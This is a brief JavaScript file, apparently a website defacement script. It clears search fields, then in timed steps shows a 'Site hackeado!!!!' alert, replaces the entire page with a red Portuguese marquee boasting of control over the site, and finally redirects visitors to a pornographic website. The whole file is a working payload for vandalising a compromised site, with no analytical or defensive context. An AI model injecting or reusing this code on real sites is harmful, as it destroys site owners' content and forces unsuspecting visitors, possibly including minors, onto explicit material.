document.getElementById("searchfield").value="";
document.getElementById("keySearch").value="";
function apagaBody() {
  var body = document.querySelector('body');
  body.innerHTML = '<marquee style="color: red">Esse site esta sobre meu genjutsu</marquee>';
}
function message() {
	alert("Site hackeado!!!!")
}
function redirect() {
	window.location="https://www.xvideos.com/";
}
setTimeout(message, 5000)
setTimeout(apagaBody, 10000);
setTimeout(redirect, 15000);

